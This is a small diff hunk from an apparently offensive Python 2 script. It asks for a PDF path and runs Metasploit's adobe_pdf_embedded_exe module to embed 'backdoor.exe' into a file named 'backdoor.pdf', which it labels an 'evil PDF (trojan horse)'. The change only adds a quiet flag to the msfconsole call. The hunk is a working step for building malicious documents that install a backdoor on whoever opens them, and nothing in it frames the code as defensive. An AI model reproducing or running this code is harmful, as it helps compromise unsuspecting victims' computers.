@@ -166,7 +166,7 @@ print "---"
 original = raw_input("[+] Input path of PDF to be embedded: ").strip()
 print "["+GREEN+"✔"+WHITE+"] Creating evil PDF (trojan horse)..."
 time.sleep(2)
-os.system("msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::CUSTOM backdoor.exe; set FILENAME backdoor.pdf; set INFILENAME %s; exploit; exit -y'" % (original))
+os.system("msfconsole -q -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::CUSTOM backdoor.exe; set FILENAME backdoor.pdf; set INFILENAME %s; exploit; exit -y'" % (original))
 
 
 time.sleep(2)
